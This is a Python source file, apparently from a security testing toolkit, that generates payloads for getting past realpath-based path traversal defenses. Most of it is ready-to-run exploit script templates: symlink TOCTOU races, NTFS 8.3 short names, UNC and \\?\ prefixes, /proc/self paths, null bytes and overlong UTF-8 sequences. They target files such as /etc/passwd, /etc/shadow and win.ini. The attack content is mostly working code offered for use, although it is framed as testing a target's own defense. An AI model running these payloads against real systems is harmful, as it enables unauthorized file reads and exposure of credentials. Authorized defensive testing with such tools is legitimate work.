#!/usr/bin/env python3
"""Realpath bypass payload generator.

Most path traversal defenses use the canonical pattern:

    real_base = os.path.realpath(base)
    resolved  = os.path.realpath(os.path.join(base, user_input))
    if not resolved.startswith(real_base + os.sep):
        raise ValueError("blocked")

This module generates payloads that escape that defense. Each technique
targets a different assumption the pattern makes:

    1. The filesystem is case-sensitive        (it may not be)
    2. realpath returns a unique canonical form (8.3 short names break this)
    3. The check and the open are atomic        (TOCTOU race breaks this)
    4. All path prefixes are equivalent         (UNC / \\?\\ are not)
    5. Only the local filesystem is reachable   (/proc/self/root is not)
    6. Null bytes are rejected                  (C extensions may not)
    7. The path separator is consistent         (mixed separators confuse)
    8. Symlinks can only exist if we create them (writable base dirs)

Every payload documents what conditions it needs and on what platform it
applies. The PoC generator at poc_gen42.py uses these to build complete
exploit scripts that test a target's path traversal defense.
"""
from __future__ import annotations

import os
import platform
import string
from dataclasses import dataclass, field


VERSION = "4.2"


# --------------------------------------------------------------------------- #
# schema
# --------------------------------------------------------------------------- #

@dataclass
class BypassPayload:
    """A single path traversal payload that targets realpath-based defenses."""
    technique: str
    payload: str
    platform: str          # "windows", "linux", "macos", "any"
    requires: str          # human-readable preconditions
    description: str
    severity: str = "high" # high = proven bypass, medium = conditional, low = historical
    references: tuple[str, ...] = ()


@dataclass
class BypassScript:
    """A complete Python script that tests one bypass technique."""
    technique: str
    code: str
    platform: str
    requires: str
    description: str
    references: tuple[str, ...] = ()


# --------------------------------------------------------------------------- #
# helpers
# --------------------------------------------------------------------------- #

def _fill(template: str, **kw) -> str:
    for key, value in kw.items():
        template = template.replace("%%" + key + "%%", str(value))
    return template


def _refs(*urls: str) -> tuple[str, ...]:
    base = ("https://cwe.mitre.org/data/definitions/22.html",)
    return base + urls


# --------------------------------------------------------------------------- #
# 1. TOCTOU race (time-of-check / time-of-use)
# --------------------------------------------------------------------------- #
# Between realpath() and open(), swap a symlink. The check sees base/safe,
# the open sees base/evil -> /etc/passwd.

_TOCTOU_PAYLOADS = [
    BypassPayload(
        technique="toctou-symlink-race",
        payload="race_target",
        platform="linux",
        requires="write access inside base directory; multi-threaded or multi-process target",
        description=(
            "Create a file inside base dir, pass the check, then race to replace it "
            "with a symlink to /etc/passwd before the open() call. The window is "
            "typically microseconds but reliable with enough attempts."
        ),
        severity="high",
        references=_refs(
            "https://cwe.mitre.org/data/definitions/367.html",
            "CAPEC-29: TOCTOU Race Condition",
        ),
    ),
]

_TOCTOU_SCRIPT = r'''#!/usr/bin/env python3
"""TOCTOU realpath bypass: symlink race between check and open.

Target base: %%BASE%%
Goal: read %%GOAL%%

The defense calls realpath(join(base, filename)) and checks startswith(base).
We create a normal file that passes, then race to replace it with a symlink
before the target opens it.

Requires: write access inside %%BASE%%
"""
import os
import sys
import time
import threading
import tempfile

BASE_DIR = "%%BASE%%"
GOAL_FILE = "%%GOAL%%"
RACE_ATTEMPTS = 5000

stop_flag = threading.Event()
success_flag = threading.Event()


def create_race_file(race_path, goal):
    """Thread that flips between regular file and symlink."""
    for _ in range(RACE_ATTEMPTS):
        if stop_flag.is_set():
            break
        try:
            if os.path.islink(race_path):
                os.unlink(race_path)
                with open(race_path, "w") as f:
                    f.write("safe")
            else:
                os.unlink(race_path)
                os.symlink(goal, race_path)
        except OSError:
            pass


def check_and_open(base, filename):
    """Simulate the vulnerable realpath + startswith + open pattern."""
    real_base = os.path.realpath(base)
    path = os.path.join(base, filename)
    resolved = os.path.realpath(path)
    if not resolved.startswith(real_base + os.sep) and resolved != real_base:
        return None, "blocked by realpath check"
    # TOCTOU gap: between the check above and the open below
    try:
        with open(path, "r") as f:
            return f.read(), "opened"
    except OSError as e:
        return None, str(e)


def main():
    race_name = "owen_race_%d" % os.getpid()
    race_path = os.path.join(BASE_DIR, race_name)

    # Create the initial safe file
    try:
        with open(race_path, "w") as f:
            f.write("safe")
    except OSError as e:
        print("SKIP: cannot write to base dir: %s" % e)
        sys.exit(2)

    print("[*] Race file: %s" % race_path)
    print("[*] Goal: %s" % GOAL_FILE)
    print("[*] Starting %d race attempts..." % RACE_ATTEMPTS)

    racer = threading.Thread(target=create_race_file,
                             args=(race_path, GOAL_FILE))
    racer.daemon = True
    racer.start()

    wins = 0
    for i in range(RACE_ATTEMPTS):
        content, status = check_and_open(BASE_DIR, race_name)
        if content and content != "safe":
            wins += 1
            print("[!] RACE WON on attempt %d: read %d bytes from %s"
                  % (i, len(content), GOAL_FILE))
            print("[!] Content preview: %s" % content[:200])
            success_flag.set()
            break

    stop_flag.set()
    racer.join(timeout=2)

    # Cleanup
    try:
        os.unlink(race_path)
    except OSError:
        pass

    if wins:
        print("[+] VULNERABLE: TOCTOU race bypassed realpath defense")
        sys.exit(0)
    else:
        print("[-] Race did not trigger in %d attempts (may need more)" % RACE_ATTEMPTS)
        sys.exit(1)


if __name__ == "__main__":
    main()
'''


# --------------------------------------------------------------------------- #
# 2. Case sensitivity confusion (Windows / macOS HFS+)
# --------------------------------------------------------------------------- #
# realpath() returns the canonical casing. If the code compares with a
# hardcoded base path in different casing, the startswith check fails to
# block traversal OR succeeds when it shouldn't.

_CASE_PAYLOADS = [
    BypassPayload(
        technique="case-confusion-base-mismatch",
        payload="../../../etc/passwd",
        platform="windows",
        requires="hardcoded base path with different casing than filesystem canonical form",
        description=(
            "If the application stores the base path as '/Var/Www/Uploads' but "
            "realpath returns '/var/www/uploads', the startswith check uses the "
            "wrong casing. On case-insensitive filesystems, a traversal payload "
            "resolves to the true canonical path which won't match the hardcoded base."
        ),
        severity="medium",
        references=_refs("OWASP: A01:2021 Broken Access Control"),
    ),
    BypassPayload(
        technique="case-confusion-parameter",
        payload="../../../ETC/PASSWD",
        platform="windows",
        requires="case-insensitive filesystem; target file accessible via alternate casing",
        description=(
            "On Windows and macOS HFS+ (default), /etc/passwd and /ETC/PASSWD "
            "resolve to the same file. If the defense whitelists certain extensions "
            "or path components case-sensitively, mixed-case bypasses it."
        ),
        severity="medium",
    ),
]

_CASE_SCRIPT = r'''#!/usr/bin/env python3
"""Case-sensitivity confusion bypass for realpath defenses.

Target base: %%BASE%%
Goal: read %%GOAL%%

On case-insensitive filesystems (Windows NTFS, macOS HFS+), the canonical
casing from realpath() may not match a hardcoded base path. This script
tests whether the target's defense is vulnerable to casing mismatches.
"""
import os
import sys

BASE_DIR = "%%BASE%%"
GOAL_FILE = "%%GOAL%%"

CASE_VARIANTS = [
    BASE_DIR.upper(),
    BASE_DIR.lower(),
    BASE_DIR.swapcase(),
    BASE_DIR[0].upper() + BASE_DIR[1:].lower(),
]


def check_defense(base, user_input):
    """The standard realpath defense."""
    real_base = os.path.realpath(base)
    resolved = os.path.realpath(os.path.join(base, user_input))
    if not resolved.startswith(real_base + os.sep) and resolved != real_base:
        return False, "blocked"
    return True, resolved


def main():
    real_canonical = os.path.realpath(BASE_DIR)
    print("[*] Canonical base: %s" % real_canonical)
    print("[*] Testing %d case variants..." % len(CASE_VARIANTS))

    traversal = os.path.relpath(GOAL_FILE, BASE_DIR).replace("\\", "/")

    for variant in CASE_VARIANTS:
        real_variant = os.path.realpath(variant)
        mismatch = real_variant != real_canonical

        if mismatch and os.path.exists(real_variant):
            print("[!] CASE MISMATCH: realpath('%s') = '%s' != '%s'"
                  % (variant, real_variant, real_canonical))
            # If the app uses 'variant' as base but realpath resolves differently,
            # startswith(realpath(variant)) won't match startswith(realpath(BASE_DIR))
            allowed, result = check_defense(variant, traversal)
            if allowed:
                print("[+] BYPASS: traversal allowed through case-confused base")
                print("    Input: base=%s, path=%s" % (variant, traversal))
                print("    Resolved: %s" % result)
                sys.exit(0)

        # Also test: same base but the traversal payload itself uses different casing
        for goal_variant in [GOAL_FILE.upper(), GOAL_FILE.lower(), GOAL_FILE.swapcase()]:
            goal_traversal = os.path.relpath(goal_variant, BASE_DIR).replace("\\", "/")
            allowed, result = check_defense(BASE_DIR, goal_traversal)
            if allowed:
                actual = os.path.realpath(os.path.join(BASE_DIR, goal_traversal))
                if os.path.exists(actual):
                    print("[+] BYPASS: case-variant goal resolved to existing file")
                    print("    Payload: %s" % goal_traversal)
                    print("    Resolved: %s" % actual)
                    sys.exit(0)

    print("[-] Case confusion did not bypass the defense")
    sys.exit(1)


if __name__ == "__main__":
    main()
'''


# --------------------------------------------------------------------------- #
# 3. Windows 8.3 short names (NTFS legacy)
# --------------------------------------------------------------------------- #
# NTFS generates 8.3 short names (e.g., PROGRA~1 for "Program Files").
# realpath() may not normalize these back to the long form on all versions,
# so startswith(long_base) fails against a short-name-resolved path.

_SHORT_NAME_PAYLOADS = [
    BypassPayload(
        technique="ntfs-8dot3-short-name",
        payload="..\\..\\..\\PROGRA~1\\target.txt",
        platform="windows",
        requires="NTFS with 8.3 name generation enabled (default); base path uses long name",
        description=(
            "NTFS automatically generates 8.3 short names (e.g., 'Program Files' -> "
            "'PROGRA~1'). If the defense stores the base path as the long name but "
            "the attacker provides a short name, realpath may resolve to a different "
            "string, bypassing startswith."
        ),
        severity="high",
        references=_refs(
            "https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file#short-vs-long-names",
        ),
    ),
]

_SHORT_NAME_SCRIPT = r'''#!/usr/bin/env python3
"""Windows 8.3 short name bypass for realpath defenses.

Target base: %%BASE%%
Goal: read %%GOAL%%

NTFS generates 8.3 short names (PROGRA~1 for 'Program Files'). This script
discovers short names for path components and tests whether using them
bypasses the realpath + startswith defense.
"""
import os
import sys
import subprocess
import ctypes

if sys.platform != "win32":
    print("SKIP: Windows-only technique")
    sys.exit(2)

BASE_DIR = "%%BASE%%"
GOAL_FILE = "%%GOAL%%"


def get_short_path(long_path):
    """Get the 8.3 short path name for a Windows path."""
    try:
        buf_size = ctypes.windll.kernel32.GetShortPathNameW(long_path, None, 0)
        if buf_size == 0:
            return None
        buf = ctypes.create_unicode_buffer(buf_size)
        ctypes.windll.kernel32.GetShortPathNameW(long_path, buf, buf_size)
        return buf.value
    except (OSError, AttributeError):
        return None


def get_long_path(short_path):
    """Get the long path name from a short path."""
    try:
        buf_size = ctypes.windll.kernel32.GetLongPathNameW(short_path, None, 0)
        if buf_size == 0:
            return None
        buf = ctypes.create_unicode_buffer(buf_size)
        ctypes.windll.kernel32.GetLongPathNameW(short_path, buf, buf_size)
        return buf.value
    except (OSError, AttributeError):
        return None


def main():
    real_base = os.path.realpath(BASE_DIR)
    short_base = get_short_path(real_base)

    print("[*] Long base: %s" % real_base)
    print("[*] Short base: %s" % short_base)

    if not short_base or short_base == real_base:
        print("[-] No 8.3 short name for base directory")
        # Try individual components
        parts = real_base.split(os.sep)
        for i in range(len(parts)):
            prefix = os.sep.join(parts[:i+1])
            if os.path.exists(prefix):
                sp = get_short_path(prefix)
                if sp and sp != prefix:
                    print("[*] Short name found: %s -> %s" % (prefix, sp))

    if short_base and short_base != real_base:
        # Test: use short-name base to bypass long-name defense
        goal_abs = os.path.realpath(GOAL_FILE)
        traversal = os.path.relpath(goal_abs, short_base)

        resolved_from_short = os.path.realpath(os.path.join(short_base, traversal))
        resolved_from_long = os.path.realpath(os.path.join(real_base, traversal))

        # The defense checks against long base
        escapes_long = (not resolved_from_long.startswith(real_base + os.sep)
                        and resolved_from_long != real_base)

        # But what if we provide the short base?
        # Some apps get the base from config (long) but user controls a prefix
        print("[*] Testing short-name path resolution...")

        # Generate payloads using short-name path components
        short_goal = get_short_path(goal_abs)
        if short_goal and short_goal != goal_abs:
            print("[!] Goal has short name: %s" % short_goal)
            # Can we reach the short-named goal from the long-named base?
            try:
                short_traversal = os.path.relpath(short_goal, real_base)
                resolved = os.path.realpath(os.path.join(real_base, short_traversal))
                check = resolved.startswith(real_base + os.sep)
                if not check and resolved != real_base:
                    print("[+] BYPASS: short-name goal escapes long-name base check")
                    print("    Payload: %s" % short_traversal)
                    print("    Resolved: %s" % resolved)
                    sys.exit(0)
            except ValueError:
                pass

        # Test mixed: short-name components in the traversal path
        for depth in range(1, 6):
            target_parts = goal_abs.split(os.sep)
            for i in range(len(target_parts)):
                prefix = os.sep.join(target_parts[:i+1])
                sp = get_short_path(prefix) if os.path.exists(prefix) else None
                if sp and sp != prefix:
                    # Build traversal using short-name component
                    short_parts = list(target_parts)
                    short_prefix_parts = sp.split(os.sep)
                    if len(short_prefix_parts) == i + 1:
                        short_parts[:i+1] = short_prefix_parts
                    mixed_goal = os.sep.join(short_parts)
                    try:
                        mixed_traversal = os.path.relpath(mixed_goal, real_base)
                        resolved = os.path.realpath(
                            os.path.join(real_base, mixed_traversal))
                        if resolved != os.path.realpath(
                                os.path.join(real_base, mixed_traversal)):
                            print("[+] BYPASS: mixed short/long name resolution mismatch")
                            sys.exit(0)
                    except ValueError:
                        pass

    # Check if 8.3 generation is even enabled
    try:
        result = subprocess.run(
            ["fsutil", "8dot3name", "query", real_base[:2]],
            capture_output=True, text=True, timeout=5)
        print("[*] 8.3 status: %s" % result.stdout.strip())
    except (OSError, subprocess.TimeoutExpired):
        pass

    print("[-] 8.3 short name bypass did not succeed")
    sys.exit(1)


if __name__ == "__main__":
    main()
'''


# --------------------------------------------------------------------------- #
# 4. UNC / extended-length path prefix (Windows)
# --------------------------------------------------------------------------- #
# \\?\ disables all path parsing — no . or .. processing, no normalization.
# If the defense doesn't handle \\?\ consistently, resolved paths won't match.

_UNC_PAYLOADS = [
    BypassPayload(
        technique="unc-extended-prefix",
        payload="\\\\?\\C:\\Windows\\win.ini",
        platform="windows",
        requires="target processes paths with extended-length prefix",
        description=(
            "The \\\\?\\ prefix tells Windows to skip ALL path parsing. "
            "os.path.realpath may or may not strip this prefix, and if the "
            "defense compares a \\\\?\\ path against a non-prefixed base, "
            "startswith always fails even for paths inside the base."
        ),
        severity="high",
        references=_refs(
            "https://docs.microsoft.com/en-us/windows/win32/fileio/naming-a-file#extended-length-paths",
        ),
    ),
    BypassPayload(
        technique="unc-network-path",
        payload="\\\\127.0.0.1\\C$\\Windows\\win.ini",
        platform="windows",
        requires="admin share accessible (C$); same-host UNC resolution",
        description=(
            "UNC path \\\\127.0.0.1\\C$ accesses the same filesystem via the "
            "admin share. realpath resolves this to a UNC path, not a local "
            "path, so startswith(local_base) fails."
        ),
        severity="high",
    ),
    BypassPayload(
        technique="unc-dot-path",
        payload="\\\\.\\C:\\Windows\\win.ini",
        platform="windows",
        requires="device namespace access; target opens paths with device prefix",
        description=(
            "The \\\\.\\  prefix accesses the Win32 device namespace. "
            "realpath may resolve it differently than standard paths."
        ),
        severity="medium",
    ),
]

_UNC_SCRIPT = r'''#!/usr/bin/env python3
"""UNC / extended-length path prefix bypass for realpath defenses.

Target base: %%BASE%%
Goal: read %%GOAL%%

Windows extended-length paths (\\?\) skip all normalization. UNC paths
(\\server\share) resolve through the network stack. Both produce
canonical forms that may not match a local base path in startswith.
"""
import os
import sys

if sys.platform != "win32":
    print("SKIP: Windows-only technique")
    sys.exit(2)

BASE_DIR = "%%BASE%%"
GOAL_FILE = "%%GOAL%%"


def check_defense(base, user_input):
    """Standard realpath defense."""
    real_base = os.path.realpath(base)
    resolved = os.path.realpath(os.path.join(base, user_input))
    if not resolved.startswith(real_base + os.sep) and resolved != real_base:
        return False, resolved
    return True, resolved


def main():
    real_base = os.path.realpath(BASE_DIR)
    real_goal = os.path.realpath(GOAL_FILE)
    drive = real_base[0]  # e.g., 'C'

    print("[*] Base: %s" % real_base)
    print("[*] Goal: %s" % real_goal)

    # Extended-length prefix variants
    prefixed_variants = [
        ("\\\\?\\" + real_goal, "extended-length absolute"),
        ("\\\\.\\" + real_goal, "device-namespace absolute"),
        ("\\\\127.0.0.1\\" + drive + "$" + real_goal[2:], "UNC admin share"),
        ("\\\\localhost\\" + drive + "$" + real_goal[2:], "UNC localhost"),
        ("\\\\?\\" + "UNC\\127.0.0.1\\" + drive + "$" + real_goal[2:],
         "extended UNC"),
    ]

    for variant, label in prefixed_variants:
        # Test 1: does realpath normalize this to the same form as the base?
        try:
            resolved = os.path.realpath(variant)
        except (OSError, ValueError):
            print("[*] %s: realpath raised exception" % label)
            continue

        matches_base = resolved.startswith(real_base)
        reaches_goal = os.path.exists(variant) if len(variant) < 260 else False

        print("[*] %s:" % label)
        print("    Input:    %s" % variant[:100])
        print("    Resolved: %s" % resolved[:100])
        print("    Matches base: %s" % matches_base)

        if not matches_base and reaches_goal:
            print("[+] BYPASS: path reaches goal but realpath doesn't match base!")
            try:
                with open(variant, "r") as f:
                    content = f.read(200)
                print("[+] Read %d bytes: %s" % (len(content), content[:80]))
                sys.exit(0)
            except OSError as e:
                print("    (exists but cannot read: %s)" % e)

    # Test 2: provide a UNC path as "user input" to the defense
    unc_payloads = [
        "\\\\?\\" + real_goal,
        "\\\\.\\" + real_goal,
        "\\\\127.0.0.1\\" + drive + "$" + real_goal[2:],
    ]

    for payload in unc_payloads:
        allowed, resolved = check_defense(BASE_DIR, payload)
        if allowed:
            print("[+] BYPASS: defense allowed UNC payload through")
            print("    Payload: %s" % payload[:100])
            print("    Resolved: %s" % resolved[:100])
            sys.exit(0)

    print("[-] UNC/extended-length prefix bypass did not succeed")
    sys.exit(1)


if __name__ == "__main__":
    main()
'''


# --------------------------------------------------------------------------- #
# 5. /proc/self/root (Linux)
# --------------------------------------------------------------------------- #
# On Linux, /proc/self/root is a symlink to /. Combined with a base dir
# path, it can confuse defenses that don't expect procfs paths.

_PROC_PAYLOADS = [
    BypassPayload(
        technique="proc-self-root",
        payload="/proc/self/root/etc/passwd",
        platform="linux",
        requires="procfs mounted (default on Linux); target path is absolute or attacker controls prefix",
        description=(
            "/proc/self/root is a symlink to the process's filesystem root. "
            "realpath resolves it to /, so /proc/self/root/etc/passwd -> /etc/passwd. "
            "But some defenses check the literal path before calling realpath, "
            "or use a second non-canonical check."
        ),
        severity="medium",
        references=_refs("https://man7.org/linux/man-pages/man5/proc.5.html"),
    ),
    BypassPayload(
        technique="proc-self-fd-redirect",
        payload="/proc/self/fd/",
        platform="linux",
        requires="procfs mounted; target has open file descriptors to sensitive files",
        description=(
            "/proc/self/fd/N symlinks to the file opened as fd N. If the target "
            "process has /etc/shadow or a config file open, its fd symlink reaches "
            "it without any ../ traversal."
        ),
        severity="high",
    ),
    BypassPayload(
        technique="proc-self-cwd",
        payload="/proc/self/cwd/../../../etc/passwd",
        platform="linux",
        requires="procfs mounted; target cwd is known",
        description=(
            "/proc/self/cwd symlinks to the process working directory. Traversing "
            "from there reaches the filesystem root without the original ../ pattern "
            "that simple filters block."
        ),
        severity="medium",
    ),
]

_PROC_SCRIPT = r'''#!/usr/bin/env python3
"""Proc filesystem bypass for realpath defenses.

Target base: %%BASE%%
Goal: read %%GOAL%%

/proc/self/root, /proc/self/cwd, and /proc/self/fd/* are symlinks that
provide alternate paths to filesystem locations. This script tests whether
these bypass the realpath + startswith defense.
"""
import os
import sys

if sys.platform != "linux":
    print("SKIP: Linux-only technique")
    sys.exit(2)

BASE_DIR = "%%BASE%%"
GOAL_FILE = "%%GOAL%%"


def check_defense(base, user_input):
    """Standard realpath defense."""
    real_base = os.path.realpath(base)
    resolved = os.path.realpath(os.path.join(base, user_input))
    if not resolved.startswith(real_base + os.sep) and resolved != real_base:
        return False, resolved
    return True, resolved


def main():
    real_base = os.path.realpath(BASE_DIR)
    print("[*] Base: %s" % real_base)

    proc_payloads = [
        ("/proc/self/root" + GOAL_FILE, "proc/self/root absolute"),
        ("/proc/self/cwd/" + os.path.relpath(GOAL_FILE, "/"), "proc/self/cwd relative"),
    ]

    # Discover open file descriptors
    fd_dir = "/proc/self/fd"
    if os.path.isdir(fd_dir):
        for fd in os.listdir(fd_dir):
            try:
                target = os.readlink(os.path.join(fd_dir, fd))
                if target == os.path.realpath(GOAL_FILE):
                    proc_payloads.append(
                        ("/proc/self/fd/" + fd, "proc/self/fd/%s -> %s" % (fd, target)))
            except OSError:
                pass

    for payload, label in proc_payloads:
        print("[*] Testing %s: %s" % (label, payload[:80]))

        # Test 1: does realpath normalize proc paths consistently?
        try:
            resolved = os.path.realpath(payload)
        except OSError:
            continue

        # Test 2: if the app does a naive prefix check before calling realpath
        # (e.g., checking the literal string starts with base)
        naive_starts = payload.startswith(real_base)
        real_starts = resolved.startswith(real_base)

        print("    Resolved: %s" % resolved)
        print("    Naive prefix match: %s, Realpath prefix match: %s"
              % (naive_starts, real_starts))

        # If the defense checks the raw input first (optimization), this bypasses
        if not naive_starts and os.path.exists(resolved):
            # The raw path doesn't look like it's in base, so a naive pre-filter
            # might reject it -- but some poorly ordered defenses let it through
            pass

        # The real bypass: use proc path as part of a join
        relative_proc = os.path.relpath(payload, real_base)
        allowed, result = check_defense(BASE_DIR, relative_proc)
        if allowed and os.path.realpath(result) == os.path.realpath(GOAL_FILE):
            print("[+] BYPASS: proc path reached goal through defense!")
            print("    Payload: %s" % relative_proc)
            sys.exit(0)

    # Test /proc/self/root specifically
    proc_root = "/proc/self/root"
    if os.path.exists(proc_root):
        goal_via_proc = proc_root + GOAL_FILE
        resolved = os.path.realpath(goal_via_proc)
        print("[*] /proc/self/root + goal resolves to: %s" % resolved)
        if resolved == os.path.realpath(GOAL_FILE):
            print("[*] realpath correctly canonicalizes proc paths")
            print("[*] Defense holds against simple proc-based traversal")
        else:
            print("[!] Unexpected resolution: defense may be bypassable")

    print("[-] Proc filesystem bypass did not succeed against standard realpath defense")
    print("[*] NOTE: defense variations (pre-filter, double-check, path-as-string)")
    print("    may still be vulnerable; test the actual target code")
    sys.exit(1)


if __name__ == "__main__":
    main()
'''


# --------------------------------------------------------------------------- #
# 6. Null byte injection (historical / C-extension targets)
# --------------------------------------------------------------------------- #

_NULL_PAYLOADS = [
    BypassPayload(
        technique="null-byte-truncation",
        payload="../../../etc/passwd\x00.png",
        platform="linux",
        requires="C extension or legacy system that truncates at null byte; Python <3 or C FFI boundary",
        description=(
            "In C, strings are null-terminated. If the path crosses a Python->C "
            "boundary (ctypes, C extension, CGI), the OS sees '/etc/passwd' while "
            "Python sees '/etc/passwd\\x00.png' (which may pass an extension check). "
            "Python 3 raises ValueError on null bytes in os.path functions, but "
            "the target may use lower-level APIs."
        ),
        severity="low",
        references=_refs(
            "https://cwe.mitre.org/data/definitions/158.html",
            "OWASP: Null Byte Injection",
        ),
    ),
]

_NULL_SCRIPT = r'''#!/usr/bin/env python3
"""Null byte truncation bypass for path defenses.

Target base: %%BASE%%
Goal: read %%GOAL%%

If the target application passes paths through a C boundary (extension,
FFI, CGI), null bytes truncate the string at the OS level while Python
sees the full string including the .png suffix.

Python 3 blocks null bytes in os.path functions. This script tests whether
the target's specific code path has the same protection.
"""
import os
import sys

BASE_DIR = "%%BASE%%"
GOAL_FILE = "%%GOAL%%"

SUFFIXES = [".png", ".jpg", ".gif", ".pdf", ".doc", ".txt"]


def main():
    print("[*] Testing null byte injection variants...")

    for suffix in SUFFIXES:
        payload = GOAL_FILE + "\x00" + suffix

        # Python 3 should raise ValueError
        try:
            resolved = os.path.realpath(payload)
            print("[!] UNEXPECTED: realpath accepted null byte: %s" % repr(payload))
            print("    Resolved: %s" % resolved)
            if os.path.exists(resolved):
                print("[+] BYPASS: null byte truncation reached target!")
                sys.exit(0)
        except (ValueError, TypeError):
            pass  # Expected in Python 3

        # Test via join
        relative = os.path.relpath(GOAL_FILE, BASE_DIR) + "\x00" + suffix
        try:
            joined = os.path.join(BASE_DIR, relative)
            resolved = os.path.realpath(joined)
            print("[!] UNEXPECTED: join + realpath accepted null byte")
            sys.exit(0)
        except (ValueError, TypeError):
            pass  # Expected

    print("[-] Python 3 correctly blocks null bytes in path functions")
    print("[*] NOTE: if target uses ctypes/cffi/subprocess to open files,")
    print("    null byte truncation may still work at the C level")
    sys.exit(1)


if __name__ == "__main__":
    main()
'''


# --------------------------------------------------------------------------- #
# 7. Symlink planted inside base directory
# --------------------------------------------------------------------------- #

_SYMLINK_PAYLOADS = [
    BypassPayload(
        technique="symlink-in-base-dir",
        payload="uploads/evil_link",
        platform="any",
        requires="write access inside base directory (upload, temp dir, shared hosting)",
        description=(
            "If the attacker can create a symlink inside the base directory "
            "(via file upload, shared hosting, or writable subdirectory), the "
            "symlink points outside. realpath resolves it to the external target, "
            "and startswith correctly BLOCKS it -- but if the defense opens the "
            "non-canonical path instead of the resolved one, the symlink is followed."
        ),
        severity="high",
    ),
    BypassPayload(
        technique="symlink-chain",
        payload="a",
        platform="linux",
        requires="write access; ability to create multiple symlinks",
        description=(
            "Chain of symlinks: a -> b -> c -> /etc/passwd. Each individual "
            "link stays inside the base directory, but the chain resolves outside. "
            "Defenses that check only one level of symlink resolution are bypassed."
        ),
        severity="high",
    ),
]

_SYMLINK_SCRIPT = r'''#!/usr/bin/env python3
"""Symlink-in-base-dir bypass for realpath defenses.

Target base: %%BASE%%
Goal: read %%GOAL%%

If the attacker can plant a symlink inside the base directory, it points
to an external file. This script creates the symlink, tests the defense,
and cleans up.

Requires: write access inside %%BASE%%
"""
import os
import sys
import tempfile

BASE_DIR = "%%BASE%%"
GOAL_FILE = "%%GOAL%%"


def check_defense_canonical(base, user_input):
    """Defense that opens the RESOLVED path (correct implementation)."""
    real_base = os.path.realpath(base)
    resolved = os.path.realpath(os.path.join(base, user_input))
    if not resolved.startswith(real_base + os.sep) and resolved != real_base:
        return False, "blocked", resolved
    return True, "allowed", resolved


def check_defense_naive(base, user_input):
    """Defense that checks realpath but opens the ORIGINAL path (vulnerable)."""
    real_base = os.path.realpath(base)
    path = os.path.join(base, user_input)
    resolved = os.path.realpath(path)
    if not resolved.startswith(real_base + os.sep) and resolved != real_base:
        return False, "blocked", resolved
    # BUG: opens the non-canonical path, which follows symlinks
    return True, "allowed-but-opens-original", path


def main():
    link_name = "owen_symlink_%d" % os.getpid()
    link_path = os.path.join(BASE_DIR, link_name)
    goal_abs = os.path.realpath(GOAL_FILE)

    # Create symlink inside base dir pointing to goal
    try:
        os.symlink(goal_abs, link_path)
    except OSError as e:
        print("SKIP: cannot create symlink in base dir: %s" % e)
        print("[*] On Windows, symlinks may require admin or developer mode")
        sys.exit(2)

    print("[*] Created symlink: %s -> %s" % (link_path, goal_abs))

    try:
        # Test canonical defense (should block)
        allowed, status, resolved = check_defense_canonical(BASE_DIR, link_name)
        print("[*] Canonical defense: %s (resolved: %s)" % (status, resolved))

        if not allowed:
            print("[+] Canonical defense correctly blocks symlink traversal")
        else:
            print("[!] UNEXPECTED: canonical defense allowed symlink traversal!")

        # Test naive defense (opens original path = vulnerable)
        allowed, status, path = check_defense_naive(BASE_DIR, link_name)
        print("[*] Naive defense: %s (path: %s)" % (status, path))

        if allowed and status == "allowed-but-opens-original":
            # The naive defense checked realpath (which escapes base)...
            # Actually, realpath of the symlink resolves to goal, which is OUTSIDE base.
            # So even the naive defense should block it.
            # The REAL vulnerability is when the defense doesn't use realpath at all,
            # or uses lstat instead of stat to check the path.
            resolved_link = os.path.realpath(link_path)
            if resolved_link == goal_abs:
                print("[*] realpath correctly resolves symlink to: %s" % resolved_link)
                print("[*] Standard realpath defense blocks this.")
                print("[*] But defenses using lstat() or not calling realpath are vulnerable.")

        # Test: what if defense uses os.path.abspath instead of realpath?
        abs_path = os.path.abspath(os.path.join(BASE_DIR, link_name))
        real_base = os.path.realpath(BASE_DIR)
        abs_base = os.path.abspath(BASE_DIR)

        if abs_path.startswith(abs_base + os.sep):
            # abspath doesn't resolve symlinks!
            print("[+] BYPASS: os.path.abspath does NOT resolve symlinks!")
            print("    abspath: %s (inside base)" % abs_path)
            print("    realpath: %s (outside base)" % os.path.realpath(link_path))
            print("    If defense uses abspath instead of realpath, symlink escapes!")
            try:
                with open(link_path, "r") as f:
                    content = f.read(200)
                print("[+] Read via symlink: %s" % content[:80])
                sys.exit(0)
            except OSError as e:
                print("    (symlink exists but cannot read goal: %s)" % e)
                sys.exit(0)  # bypass proven even if goal isn't readable

    finally:
        try:
            os.unlink(link_path)
            print("[*] Cleaned up symlink")
        except OSError:
            pass

    print("[-] Symlink bypass did not succeed against realpath defense")
    print("[*] Target defenses using abspath, lstat, or no canonicalization ARE vulnerable")
    sys.exit(1)


if __name__ == "__main__":
    main()
'''


# --------------------------------------------------------------------------- #
# 8. Mixed separator confusion
# --------------------------------------------------------------------------- #

_SEPARATOR_PAYLOADS = [
    BypassPayload(
        technique="mixed-separator",
        payload="..\\..\\..\\etc/passwd",
        platform="windows",
        requires="Windows target that normalizes only one separator type",
        description=(
            "Windows accepts both / and \\ as path separators. If the defense "
            "normalizes only forward slashes (or only backslashes), a payload using "
            "the other separator bypasses the ../ filter while still traversing."
        ),
        severity="medium",
    ),
    BypassPayload(
        technique="double-separator",
        payload="..//..//..//etc/passwd",
        platform="any",
        requires="defense that splits on single separator only",
        description=(
            "Double separators (// or \\\\) are normalized by realpath to single "
            "separators, but filter-based defenses may not catch '..//' as '../'."
        ),
        severity="low",
    ),
]


# --------------------------------------------------------------------------- #
# 9. Overlong UTF-8 / Unicode normalization
# --------------------------------------------------------------------------- #

_UNICODE_PAYLOADS = [
    BypassPayload(
        technique="overlong-utf8-dot",
        payload=b"\xc0\xae\xc0\xae/\xc0\xae\xc0\xae/etc/passwd".decode(
            "latin-1"),
        platform="any",
        requires="target passes raw bytes to filesystem; C/Java/PHP servlet boundary",
        description=(
            "The overlong UTF-8 encoding \\xC0\\xAE represents '.' in 2 bytes "
            "instead of 1. Filter-based defenses don't match '..' but the filesystem "
            "or middleware may decode it. realpath on the Python side won't decode "
            "these, but the actual web server (Tomcat, IIS) might."
        ),
        severity="medium",
        references=_refs(
            "https://cwe.mitre.org/data/definitions/176.html",
            "CVE-2008-2938: Tomcat overlong UTF-8 directory traversal",
        ),
    ),
    BypassPayload(
        technique="unicode-fullwidth-dot",
        payload="\uff0e\uff0e/\uff0e\uff0e/etc/passwd",
        platform="any",
